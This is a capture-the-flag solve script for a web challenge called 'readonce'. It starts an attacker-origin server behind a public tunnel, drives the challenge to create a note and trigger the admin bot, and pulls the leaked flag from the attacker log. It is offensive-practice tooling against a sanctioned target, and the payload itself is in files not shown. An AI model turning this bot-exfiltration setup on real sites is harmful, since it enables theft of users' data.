#!/usr/bin/env python3
"""readonce end-to-end solve.

  python3 solve.py https://<instance>.chal.ctf.ae https://<public-attacker-origin> [pads]

Needs a public HTTPS origin reachable by the bot, forwarding to local port 8000:
  cloudflared tunnel --url http://localhost:8000

Runs attacker.py (the attacker origin) and driver.py (create note + fire report),
then prints the flag.  See writeup.md for the mechanism.
"""
import os, re, subprocess, sys, time, signal

HERE = os.path.dirname(os.path.abspath(__file__))
APP = sys.argv[1].rstrip('/')
PUB = sys.argv[2].rstrip('/')
PADS = sys.argv[3] if len(sys.argv) > 3 else '8'
LOG = os.path.join(HERE, 'solve-attacker.log')

with open(LOG, 'wb') as lf:
    atk = subprocess.Popen([sys.executable, os.path.join(HERE, 'attacker.py'), APP, PUB, '8000', PADS],
                           stdout=lf, stderr=subprocess.STDOUT, start_new_session=True)
try:
    time.sleep(2)
    subprocess.run([sys.executable, os.path.join(HERE, 'driver.py'), APP, PUB], timeout=180)
    for _ in range(20):
        body = open(LOG, 'r', errors='replace').read()
        m = re.search(r'pwnsec\{[^}]+\}', body)
        if m:
            print('FLAG: ' + m.group(0))
            sys.exit(0)
        time.sleep(1)
    print('no flag; attacker log:\n' + open(LOG, errors='replace').read())
    sys.exit(1)
finally:
    try: os.killpg(os.getpgid(atk.pid), signal.SIGTERM)
    except Exception: pass
